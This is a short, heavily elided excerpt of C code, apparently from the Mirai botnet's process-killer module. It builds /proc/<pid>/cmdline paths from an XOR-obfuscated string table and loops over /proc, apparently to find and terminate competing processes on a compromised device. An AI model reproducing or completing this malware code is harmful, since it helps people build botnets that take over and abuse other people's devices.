...
BOOL killer_mirai_exists(char *pid) {
    ...
    table_unlock_val(XOR_CMDLINE);

    util_strcpy(rdpath, table_retrieve_val(XOR_PROC, NULL));
    util_strcat(rdpath, pid);
    util_strcat(rdpath, table_retrieve_val(XOR_CMDLINE, NULL));

    table_lock_val(XOR_PROC);
    table_lock_val(XOR_CMDLINE);
...
void killer_init(void) {
    ...
    while (TRUE) {
        ...
        DIR *dir = opendir(table_retrieve_val(XOR_PROC, NULL));
